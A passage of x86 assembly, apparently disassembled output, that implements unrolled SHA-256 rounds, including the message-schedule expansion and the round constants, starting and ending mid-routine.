xor ebp ebx
mov ebx ecx
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x28 ]
or ebx ecx
and ebx [ esp + 0x24 ]
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x28 ]
and ebx ecx
mov ecx [ esp + 0x1c ]
or ecx ebx
add ecx ebp
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x90 ]
mov ebp ecx
rol ebp 0xe
mov ebx ecx
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xc4 ]
shr ecx 0x3
xor ebp ecx
add ebp [ esp + 0xb0 ]
mov ecx ebx
rol ecx 0xf
rol ebx 0xd
xor ecx ebx
mov ebx [ esp + 0xc4 ]
shr ebx 0xa
xor ecx ebx
add ecx ebp
add ecx [ esp + 0x8c ]
mov ebx eax
ror ebx 0xb
mov ebp eax
rol ebp 0x7
xor ebx ebp
mov ebp eax
ror ebp 0x6
xor ebx ebp
mov ebp edi
xor ebp esi
and ebp eax
add ebx ecx
xor ebp esi
add ebp ebx
lea edx [ edx + ebp - 0x7e3d36d2 ]
add [ esp + 0x24 ] edx
mov [ esp + 0xcc ] ecx
mov ecx [ esp + 0x14 ]
mov [ esp + 0x10 ] edx
mov ebp [ esp + 0x18 ]
and ebp ecx
mov ebx ecx
ror ebx 0xd
mov edx ecx
rol edx 0xa
xor ebx edx
mov edx ecx
ror edx 0x2
xor ebx edx
add ebx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
or edx ecx
and edx [ esp + 0x28 ]
or edx ebp
add edx ebx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x94 ]
mov ebp edx
rol ebp 0xe
mov ebx edx
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xc8 ]
shr edx 0x3
xor ebp edx
add ebp [ esp + 0xb4 ]
mov edx ebx
rol edx 0xf
rol ebx 0xd
xor edx ebx
mov ebx [ esp + 0xc8 ]
shr ebx 0xa
xor edx ebx
add edx ebp
add edx [ esp + 0x90 ]
mov [ esp + 0xd0 ] edx
mov edx [ esp + 0x24 ]
mov ebx edx
ror ebx 0xb
mov ebp edx
rol ebp 0x7
xor ebx ebp
mov ebp edx
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0xd0 ]
mov ebp edi
xor ebp eax
and ebp edx
mov edx [ esp + 0x20 ]
xor ebp edi
add ebp ebx
lea esi [ esi + ebp - 0x6d8dd37b ]
add [ esp + 0x28 ] esi
mov [ esp + 0x10 ] esi
mov ebx edx
ror ebx 0xd
mov esi edx
rol esi 0xa
xor ebx esi
mov esi edx
ror esi 0x2
xor ebx esi
add ebx [ esp + 0x10 ]
mov esi ecx
or esi edx
and esi [ esp + 0x18 ]
mov ebp ecx
and ebp edx
or esi ebp
add esi ebx
mov [ esp + 0x2c ] esi
mov esi [ esp + 0x98 ]
mov ebp esi
rol ebp 0xe
mov ebx esi
ror ebx 0x7
xor ebp ebx
shr esi 0x3
xor ebp esi
add ebp [ esp + 0xb8 ]
mov ebx [ esp + 0xcc ]
mov esi ebx
rol esi 0xf
rol ebx 0xd
xor esi ebx
mov ebx [ esp + 0xcc ]
shr ebx 0xa
xor esi ebx
add esi ebp
add esi [ esp + 0x94 ]
mov [ esp + 0xd4 ] esi
mov esi [ esp + 0x28 ]
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
ror esi 0x6
xor ebx esi
add ebx [ esp + 0xd4 ]
mov esi eax
xor esi [ esp + 0x24 ]
mov ebp edx
and esi [ esp + 0x28 ]
xor esi eax
add esi ebx
lea edi [ esi + edi - 0x5d40175f ]
add [ esp + 0x18 ] edi
mov esi [ esp + 0x2c ]
mov [ esp + 0x10 ] edi
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
and ebp esi
mov edi esi
ror edi 0x2
xor ebx edi
add ebx [ esp + 0x10 ]
mov edi edx
or edi esi
and edi ecx
or edi ebp
add edi ebx
mov [ esp + 0x1c ] edi
mov edi [ esp + 0x9c ]
mov ebp edi
mov ebx edi
shr edi 0x3
rol ebp 0xe
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xd0 ]
xor ebp edi
add ebp [ esp + 0xbc ]
mov edi ebx
rol edi 0xf
rol ebx 0xd
xor edi ebx
mov ebx [ esp + 0xd0 ]
shr ebx 0xa
xor edi ebx
add edi ebp
add edi [ esp + 0x98 ]
mov [ esp + 0xd8 ] edi
mov edi [ esp + 0x18 ]
mov ebx edi
mov ebp edi
ror ebx 0xb
rol ebp 0x7
xor ebx ebp
ror edi 0x6
xor ebx edi
mov edi [ esp + 0x24 ]
xor edi [ esp + 0x28 ]
add ebx [ esp + 0xd8 ]
and edi [ esp + 0x18 ]
xor edi [ esp + 0x24 ]
add edi ebx
lea eax [ edi + eax - 0x57e599b5 ]
mov edi [ esp + 0x1c ]
add ecx eax
mov [ esp + 0x10 ] eax
mov ebx edi
ror ebx 0xd
mov eax edi
rol eax 0xa
xor ebx eax
mov eax edi
ror eax 0x2
xor ebx eax
add ebx [ esp + 0x10 ]
mov eax edi
or eax esi
and eax edx
mov ebp edi
and ebp esi
or eax ebp
add eax ebx
mov [ esp + 0x30 ] eax
mov eax [ esp + 0xa0 ]
mov ebp eax
mov ebx eax
shr eax 0x3
rol ebp 0xe
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xd4 ]
xor ebp eax
add ebp [ esp + 0xc0 ]
mov eax ebx
rol eax 0xf
rol ebx 0xd
xor eax ebx
mov ebx [ esp + 0xd4 ]
shr ebx 0xa
xor eax ebx
add eax ebp
add eax [ esp + 0x9c ]
mov ebx ecx
mov [ esp + 0xdc ] eax
mov eax ecx
ror eax 0xb
rol ebx 0x7
xor eax ebx
mov ebx ecx
ror ebx 0x6
xor eax ebx
add eax [ esp + 0xdc ]
mov ebx [ esp + 0x28 ]
xor ebx [ esp + 0x18 ]
and ebx ecx
xor ebx [ esp + 0x28 ]
add ebx eax
mov eax [ esp + 0x24 ]
lea eax [ ebx + eax - 0x3db47490 ]
add edx eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x30 ]
mov ebp eax
ror ebp 0xd
mov ebx eax
rol ebx 0xa
xor ebp ebx
mov ebx eax
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx edi
or ebx eax
and ebx esi
mov [ esp + 0x1c ] ebx
mov ebx edi
and ebx eax
mov eax [ esp + 0x1c ]
or eax ebx
add eax ebp
mov [ esp + 0x24 ] eax
mov eax [ esp + 0xa4 ]
mov ebp eax
rol ebp 0xe
mov ebx eax
ror ebx 0x7
xor ebp ebx
shr eax 0x3
xor ebp eax
add ebp [ esp + 0xc4 ]
mov ebx [ esp + 0xd8 ]
mov eax ebx
rol eax 0xf
rol ebx 0xd
xor eax ebx
mov ebx [ esp + 0xd8 ]
shr ebx 0xa
xor eax ebx
add eax ebp
add eax [ esp + 0xa0 ]
mov ebx edx
ror ebx 0xb
mov [ esp + 0xe0 ] eax
mov eax edx
rol eax 0x7
xor ebx eax
mov eax edx
ror eax 0x6
xor ebx eax
add ebx [ esp + 0xe0 ]
mov eax [ esp + 0x18 ]
mov ebp eax
xor ebp ecx
and ebp edx
xor ebp eax
mov eax [ esp + 0x28 ]
add ebp ebx
lea eax [ eax + ebp - 0x3893ae5d ]
add esi eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x24 ]
mov ebp eax
ror ebp 0xd
mov ebx eax
rol ebx 0xa
xor ebp ebx
mov ebx eax
ror ebx 0x2
xor ebp ebx
mov ebx [ esp + 0x30 ]
add ebp [ esp + 0x10 ]
or ebx eax
and ebx edi
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x30 ]
and ebx eax
mov eax [ esp + 0x1c ]
or eax ebx
add eax ebp
mov [ esp + 0x28 ] eax
mov eax [ esp + 0xa8 ]
mov ebp eax
rol ebp 0xe
mov ebx eax
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xdc ]
shr eax 0x3
xor ebp eax
add ebp [ esp + 0xc8 ]
mov eax ebx
rol eax 0xf
rol ebx 0xd
xor eax ebx
mov ebx [ esp + 0xdc ]
shr ebx 0xa
xor eax ebx
add eax ebp
add eax [ esp + 0xa4 ]
mov ebx esi
mov ebp esi
ror ebx 0xb
mov [ esp + 0xe4 ] eax
rol ebp 0x7
xor ebx ebp
mov ebp esi
ror ebp 0x6
xor ebx ebp
add ebx eax
mov eax [ esp + 0x18 ]
mov ebp ecx
xor ebp edx
and ebp esi
xor ebp ecx
add ebp ebx
lea eax [ eax + ebp - 0x2e6d17e7 ]
add edi eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x28 ]
mov ebp eax
ror ebp 0xd
mov ebx eax
rol ebx 0xa
xor ebp ebx
mov ebx eax
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x24 ]
or ebx eax
and ebx [ esp + 0x30 ]
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x24 ]
and ebx eax
mov eax [ esp + 0x1c ]
or eax ebx
add eax ebp
mov [ esp + 0x18 ] eax
mov eax [ esp + 0xac ]
mov ebp eax
rol ebp 0xe
mov ebx eax
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xe0 ]
shr eax 0x3
xor ebp eax
add ebp [ esp + 0xcc ]
mov eax ebx
rol eax 0xf
rol ebx 0xd
xor eax ebx
mov ebx [ esp + 0xe0 ]
shr ebx 0xa
xor eax ebx
add eax ebp
add eax [ esp + 0xa8 ]
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
mov ebp edi
ror ebp 0x6
xor ebx ebp
add ebx eax
mov ebp edx
xor ebp esi
and ebp edi
xor ebp edx
add ebp ebx
lea ecx [ ecx + ebp - 0x2966f9dc ]
add [ esp + 0x30 ] ecx
mov [ esp + 0x10 ] ecx
mov [ esp + 0xe8 ] eax
mov eax [ esp + 0x18 ]
mov ebx eax
ror ebx 0xd
mov ecx eax
rol ecx 0xa
xor ebx ecx
mov ecx eax
ror ecx 0x2
xor ebx ecx
mov ecx [ esp + 0x28 ]
add ebx [ esp + 0x10 ]
mov ebp [ esp + 0x28 ]
and ebp eax
or ecx eax
and ecx [ esp + 0x24 ]
or ecx ebp
add ecx ebx
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0xb0 ]
mov ebp ecx
rol ebp 0xe
mov ebx ecx
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xe4 ]
shr ecx 0x3
xor ebp ecx
add ebp [ esp + 0xd0 ]
mov ecx ebx
rol ecx 0xf
rol ebx 0xd
xor ecx ebx
mov ebx [ esp + 0xe4 ]
shr ebx 0xa
xor ecx ebx
add ecx ebp
add ecx [ esp + 0xac ]
mov [ esp + 0xec ] ecx
mov ecx [ esp + 0x30 ]
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
mov ebp ecx
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0xec ]
mov ebp edi
xor ebp esi
and ebp ecx
mov ecx [ esp + 0x14 ]
xor ebp esi
add ebp ebx
lea edx [ edx + ebp - 0xbf1ca7b ]
add [ esp + 0x24 ] edx
mov [ esp + 0x10 ] edx
mov ebx ecx
ror ebx 0xd
mov edx ecx
rol edx 0xa
xor ebx edx
mov edx ecx
ror edx 0x2
xor ebx edx
add ebx [ esp + 0x10 ]
mov edx eax
or edx ecx
and edx [ esp + 0x28 ]
mov ebp eax
and ebp ecx
or edx ebp
add edx ebx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0xb4 ]
mov ebp edx
mov ebx edx
rol ebp 0xe
ror ebx 0x7
xor ebp ebx
mov ebx [ esp + 0xe8 ]
shr edx 0x3
xor ebp edx
mov edx ebx
rol edx 0xf
rol ebx 0xd
xor edx ebx
mov ebx [ esp + 0xe8 ]
shr ebx 0xa
xor edx ebx
add ebp [ esp + 0xd4 ]
add edx ebp
add edx [ esp + 0xb0 ]
mov [ esp + 0xf0 ] edx
mov edx [ esp + 0x24 ]
mov ebx edx
ror ebx 0xb
mov ebp edx
rol ebp 0x7
xor ebx ebp
ror edx 0x6
xor ebx edx
add ebx [ esp + 0xf0 ]
mov edx edi
xor edx [ esp + 0x30 ]
mov ebp ecx
and edx [ esp + 0x24 ]
xor edx edi
add edx ebx
lea esi [ edx + esi + 0x106aa070 ]
add [ esp + 0x28 ] esi
mov edx [ esp + 0x20 ]
mov [ esp + 0x10 ] esi
mov ebx edx
ror ebx 0xd
and ebp edx
mov esi edx
rol esi 0xa
xor ebx esi
mov esi edx
ror esi 0x2
xor ebx esi
add ebx [ esp + 0x10 ]
mov esi ecx
or esi edx
and esi eax
or esi ebp
add esi ebx
mov [ esp + 0x2c ] esi
mov esi [ esp + 0xec ]
mov ebp esi
mov ebx esi
shr esi 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xb8 ]
xor ebp esi
add ebp [ esp + 0xd8 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0xb8 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0xb4 ]
mov [ esp + 0xf4 ] esi
mov esi [ esp + 0x28 ]
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
ror esi 0x6
xor ebx esi
mov esi [ esp + 0x30 ]
xor esi [ esp + 0x24 ]
add ebx [ esp + 0xf4 ]
and esi [ esp + 0x28 ]
xor esi [ esp + 0x30 ]
add esi ebx
lea edi [ esi + edi + 0x19a4c116 ]
mov esi [ esp + 0x2c ]
add eax edi
mov [ esp + 0x10 ] edi
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
add ebx [ esp + 0x10 ]
mov edi edx
or edi esi
and edi ecx
mov ebp edx
and ebp esi
or edi ebp
add edi ebx
mov [ esp + 0x1c ] edi
mov edi [ esp + 0xf0 ]
mov ebp edi
mov ebx edi
shr edi 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
xor ebp edi
add ebp [ esp + 0xdc ]
mov ebx [ esp + 0xbc ]
mov edi ebx
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0xbc ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0xb8 ]
mov ebx eax
mov [ esp + 0xf8 ] edi
mov edi eax
ror edi 0xb
rol ebx 0x7
xor edi ebx
mov ebx eax
ror ebx 0x6
xor edi ebx
add edi [ esp + 0xf8 ]
mov ebx [ esp + 0x24 ]
xor ebx [ esp + 0x28 ]
and ebx eax
xor ebx [ esp + 0x24 ]
add ebx edi
mov edi [ esp + 0x30 ]
lea edi [ ebx + edi + 0x1e376c08 ]
mov ebx [ esp + 0x1c ]
add ecx edi
mov [ esp + 0x10 ] edi
mov ebp ebx
ror ebp 0xd
mov edi ebx
rol edi 0xa
xor ebp edi
mov edi ebx
ror edi 0x2
xor ebp edi
add ebp [ esp + 0x10 ]
mov edi ebx
or edi esi
and edi edx
and ebx esi
or edi ebx
add edi ebp
mov [ esp + 0x30 ] edi
mov edi [ esp + 0xf4 ]
mov ebp edi
rol ebp 0xf
mov ebx edi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xc0 ]
shr edi 0xa
xor ebp edi
mov edi ebx
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0xc0 ]
add ebp [ esp + 0xe0 ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0xbc ]
mov ebx ecx
ror ebx 0xb
mov [ esp + 0xfc ] edi
mov edi ecx
rol edi 0x7
xor ebx edi
mov edi ecx
ror edi 0x6
xor ebx edi
add ebx [ esp + 0xfc ]
mov edi [ esp + 0x28 ]
mov ebp edi
xor ebp eax
and ebp ecx
xor ebp edi
add ebp ebx
mov edi [ esp + 0x24 ]
lea edi [ edi + ebp + 0x2748774c ]
add edx edi
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x30 ]
mov ebp edi
ror ebp 0xd
mov ebx edi
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x1c ]
or ebx edi
and ebx esi
mov [ esp + 0x24 ] ebx
mov ebx [ esp + 0x1c ]
and ebx edi
mov edi [ esp + 0x24 ]
or edi ebx
add edi ebp
mov [ esp + 0x24 ] edi
mov edi [ esp + 0xf8 ]
mov ebp edi
rol ebp 0xf
mov ebx edi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xc4 ]
shr edi 0xa
xor ebp edi
add ebp [ esp + 0xe4 ]
mov edi ebx
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0xc4 ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0xc0 ]
mov ebx edx
ror ebx 0xb
mov ebp edx
rol ebp 0x7
xor ebx ebp
mov ebp edx
ror ebp 0x6
xor ebx ebp
mov ebp eax
xor ebp ecx
and ebp edx
add ebx edi
mov [ esp + 0x100 ] edi
mov edi [ esp + 0x28 ]
xor ebp eax
add ebp ebx
lea edi [ edi + ebp + 0x34b0bcb5 ]
add esi edi
mov [ esp + 0x10 ] edi
mov edi [ esp + 0x24 ]
mov ebp edi
ror ebp 0xd
mov ebx edi
rol ebx 0xa
xor ebp ebx
mov ebx edi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x30 ]
or ebx edi
and ebx [ esp + 0x1c ]
mov [ esp + 0x2c ] ebx
mov ebx [ esp + 0x30 ]
and ebx edi
mov edi [ esp + 0x2c ]
or edi ebx
add edi ebp
mov [ esp + 0x28 ] edi
mov edi [ esp + 0xfc ]
mov ebp edi
rol ebp 0xf
mov ebx edi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xc8 ]
shr edi 0xa
xor ebp edi
add ebp [ esp + 0xe8 ]
mov edi ebx
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0xc8 ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0xc4 ]
mov ebx esi
ror ebx 0xb
mov ebp esi
rol ebp 0x7
xor ebx ebp
mov ebp esi
ror ebp 0x6
xor ebx ebp
add ebx edi
mov ebp ecx
xor ebp edx
and ebp esi
xor ebp ecx
add ebp ebx
lea eax [ eax + ebp + 0x391c0cb3 ]
add [ esp + 0x1c ] eax
mov ebp [ esp + 0x24 ]
mov [ esp + 0x10 ] eax
mov [ esp + 0x104 ] edi
mov edi [ esp + 0x28 ]
mov ebx edi
ror ebx 0xd
mov eax edi
rol eax 0xa
xor ebx eax
mov eax edi
ror eax 0x2
xor ebx eax
mov eax [ esp + 0x24 ]
add ebx [ esp + 0x10 ]
or eax edi
and eax [ esp + 0x30 ]
and ebp edi
or eax ebp
add eax ebx
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x100 ]
mov ebp eax
rol ebp 0xf
mov ebx eax
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xcc ]
shr eax 0xa
xor ebp eax
add ebp [ esp + 0xec ]
mov eax ebx
rol eax 0xe
ror ebx 0x7
xor eax ebx
mov ebx [ esp + 0xcc ]
shr ebx 0x3
xor eax ebx
add eax ebp
add eax [ esp + 0xc8 ]
mov [ esp + 0x108 ] eax
mov eax [ esp + 0x1c ]
mov ebx eax
ror ebx 0xb
mov ebp eax
rol ebp 0x7
xor ebx ebp
mov ebp eax
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0x108 ]
mov ebp edx
xor ebp esi
and ebp eax
mov eax [ esp + 0x18 ]
xor ebp edx
add ebp ebx
lea ecx [ ecx + ebp + 0x4ed8aa4a ]
add [ esp + 0x30 ] ecx
mov [ esp + 0x10 ] ecx
mov ebx eax
ror ebx 0xd
mov ecx eax
rol ecx 0xa
xor ebx ecx
mov ecx eax
ror ecx 0x2
xor ebx ecx
add ebx [ esp + 0x10 ]
mov ecx edi
or ecx eax
and ecx [ esp + 0x24 ]
mov ebp edi
and ebp eax
or ecx ebp
add ecx ebx
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x104 ]
mov ebp ecx
rol ebp 0xf
mov ebx ecx
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xd0 ]
shr ecx 0xa
xor ebp ecx
add ebp [ esp + 0xf0 ]
mov ecx ebx
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ esp + 0xd0 ]
shr ebx 0x3
xor ecx ebx
add ecx ebp
add ecx [ esp + 0xcc ]
mov [ esp + 0x10c ] ecx
mov ecx [ esp + 0x30 ]
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
mov ebp ecx
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0x10c ]
mov ebp [ esp + 0x1c ]
xor ebp esi
and ebp ecx
mov ecx [ esp + 0x14 ]
xor ebp esi
add ebp ebx
lea edx [ edx + ebp + 0x5b9cca4f ]
add [ esp + 0x24 ] edx
mov [ esp + 0x10 ] edx
mov ebx ecx
ror ebx 0xd
mov edx ecx
rol edx 0xa
xor ebx edx
mov edx ecx
ror edx 0x2
xor ebx edx
add ebx [ esp + 0x10 ]
mov edx eax
or edx ecx
and edx edi
mov ebp eax
and ebp ecx
or edx ebp
add edx ebx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x108 ]
mov ebp edx
mov ebx edx
shr edx 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xd4 ]
xor ebp edx
add ebp [ esp + 0xf4 ]
mov edx ebx
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ esp + 0xd4 ]
shr ebx 0x3
xor edx ebx
add edx ebp
add edx [ esp + 0xd0 ]
mov [ esp + 0x110 ] edx
mov edx [ esp + 0x24 ]
mov ebx edx
ror ebx 0xb
mov ebp edx
rol ebp 0x7
xor ebx ebp
ror edx 0x6
xor ebx edx
mov edx [ esp + 0x1c ]
xor edx [ esp + 0x30 ]
add ebx [ esp + 0x110 ]
and edx [ esp + 0x24 ]
mov ebp ecx
xor edx [ esp + 0x1c ]
add edx ebx
lea esi [ edx + esi + 0x682e6ff3 ]
mov edx [ esp + 0x20 ]
mov [ esp + 0x10 ] esi
add edi esi
mov ebx edx
ror ebx 0xd
mov esi edx
rol esi 0xa
xor ebx esi
mov esi edx
ror esi 0x2
xor ebx esi
add ebx [ esp + 0x10 ]
mov esi ecx
or esi edx
and esi eax
and ebp edx
or esi ebp
add esi ebx
mov [ esp + 0x2c ] esi
mov esi [ esp + 0x10c ]
mov ebp esi
mov ebx esi
shr esi 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
xor ebp esi
add ebp [ esp + 0xf8 ]
mov ebx [ esp + 0xd8 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0xd8 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0xd4 ]
mov ebx edi
mov [ esp + 0x114 ] esi
mov esi edi
ror esi 0xb
rol ebx 0x7
xor esi ebx
mov ebx edi
ror ebx 0x6
xor esi ebx
add esi [ esp + 0x114 ]
mov ebx [ esp + 0x30 ]
xor ebx [ esp + 0x24 ]
and ebx edi
xor ebx [ esp + 0x30 ]
add ebx esi
mov esi [ esp + 0x1c ]
lea esi [ ebx + esi + 0x748f82ee ]
add eax esi
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x2c ]
mov ebp esi
ror ebp 0xd
mov ebx esi
rol ebx 0xa
xor ebp ebx
mov ebx esi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx edx
or ebx esi
and ebx ecx
mov [ esp + 0x1c ] ebx
mov ebx edx
and ebx esi
mov esi [ esp + 0x1c ]
or esi ebx
add esi ebp
mov [ esp + 0x1c ] esi
mov esi [ esp + 0x110 ]
mov ebp esi
mov ebx esi
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xdc ]
shr esi 0xa
xor ebp esi
add ebp [ esp + 0xfc ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0xdc ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0xd8 ]
mov ebx eax
mov [ esp + 0x118 ] esi
ror ebx 0xb
mov esi eax
rol esi 0x7
xor ebx esi
mov esi eax
ror esi 0x6
xor ebx esi
add ebx [ esp + 0x118 ]
mov esi [ esp + 0x24 ]
mov ebp esi
xor ebp edi
and ebp eax
xor ebp esi
add ebp ebx
mov esi [ esp + 0x30 ]
lea esi [ esi + ebp + 0x78a5636f ]
add ecx esi
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x1c ]
mov ebp esi
ror ebp 0xd
mov ebx esi
rol ebx 0xa
xor ebp ebx
mov ebx esi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x2c ]
or esi ebx
and esi edx
mov [ esp + 0x30 ] esi
mov esi [ esp + 0x1c ]
and esi ebx
mov ebx esi
mov esi [ esp + 0x30 ]
or esi ebx
add esi ebp
mov [ esp + 0x30 ] esi
mov esi [ esp + 0x114 ]
mov ebp esi
rol ebp 0xf
mov ebx esi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xe0 ]
shr esi 0xa
xor ebp esi
add ebp [ esp + 0x100 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0xe0 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0xdc ]
mov ebx ecx
ror ebx 0xb
mov ebp ecx
rol ebp 0x7
xor ebx ebp
mov ebp ecx
ror ebp 0x6
xor ebx ebp
mov ebp edi
xor ebp eax
and ebp ecx
add ebx esi
xor ebp edi
mov [ esp + 0x11c ] esi
mov esi [ esp + 0x24 ]
add ebp ebx
lea esi [ esi + ebp - 0x7b3787ec ]
add edx esi
mov [ esp + 0x10 ] esi
mov esi [ esp + 0x30 ]
mov ebp esi
ror ebp 0xd
mov ebx esi
rol ebx 0xa
xor ebp ebx
mov ebx esi
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx [ esp + 0x1c ]
or ebx esi
and ebx [ esp + 0x2c ]
mov [ esp + 0x24 ] ebx
mov ebx [ esp + 0x1c ]
and ebx esi
mov esi [ esp + 0x24 ]
or esi ebx
add esi ebp
mov [ esp + 0x24 ] esi
mov esi [ esp + 0x118 ]
mov ebp esi
rol ebp 0xf
mov ebx esi
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xe4 ]
shr esi 0xa
xor ebp esi
add ebp [ esp + 0x104 ]
mov esi ebx
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ esp + 0xe4 ]
shr ebx 0x3
xor esi ebx
add esi ebp
add esi [ esp + 0xe0 ]
mov ebx edx
ror ebx 0xb
mov ebp edx
rol ebp 0x7
xor ebx ebp
mov ebp edx
ror ebp 0x6
xor ebx ebp
add ebx esi
mov ebp eax
xor ebp ecx
and ebp edx
xor ebp eax
add ebp ebx
lea edi [ edi + ebp - 0x7338fdf8 ]
add [ esp + 0x2c ] edi
mov ebp [ esp + 0x30 ]
mov [ esp + 0x10 ] edi
mov [ esp + 0x120 ] esi
mov esi [ esp + 0x24 ]
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
mov edi [ esp + 0x30 ]
add ebx [ esp + 0x10 ]
or edi esi
and edi [ esp + 0x1c ]
and ebp esi
or edi ebp
add edi ebx
mov [ esp + 0x28 ] edi
mov edi [ esp + 0x11c ]
mov ebp edi
mov ebx edi
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xe8 ]
shr edi 0xa
xor ebp edi
mov edi ebx
add ebp [ esp + 0x108 ]
rol edi 0xe
ror ebx 0x7
xor edi ebx
mov ebx [ esp + 0xe8 ]
shr ebx 0x3
xor edi ebx
add edi ebp
add edi [ esp + 0xe4 ]
mov [ esp + 0x124 ] edi
mov edi [ esp + 0x2c ]
mov ebx edi
ror ebx 0xb
mov ebp edi
rol ebp 0x7
xor ebx ebp
mov ebp edi
ror ebp 0x6
xor ebx ebp
add ebx [ esp + 0x124 ]
mov ebp ecx
xor ebp edx
and ebp edi
mov edi [ esp + 0x1c ]
xor ebp ecx
add ebp ebx
lea eax [ eax + ebp - 0x6f410006 ]
add edi eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x28 ]
mov ebp eax
ror ebp 0xd
mov ebx eax
rol ebx 0xa
xor ebp ebx
mov ebx eax
ror ebx 0x2
xor ebp ebx
add ebp [ esp + 0x10 ]
mov ebx esi
or ebx eax
and ebx [ esp + 0x30 ]
mov [ esp + 0x1c ] ebx
mov ebx esi
and ebx eax
mov eax [ esp + 0x1c ]
or eax ebx
add eax ebp
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x120 ]
mov ebp eax
mov ebx eax
shr eax 0xa
rol ebp 0xf
rol ebx 0xd
xor ebp ebx
mov ebx [ esp + 0xec ]
xor ebp eax
add ebp [ esp + 0x10c ]
mov eax ebx
rol eax 0xe
ror ebx 0x7
xor eax ebx
mov ebx [ esp + 0xec ]
shr ebx 0x3
xor eax ebx
add eax ebp
add eax [ esp + 0xe8 ]
mov ebx edi
mov [ esp + 0x128 ] eax
mov eax edi
ror eax 0xb
rol ebx 0x7
xor eax ebx
mov ebx edi
ror ebx 0x6
xor eax ebx
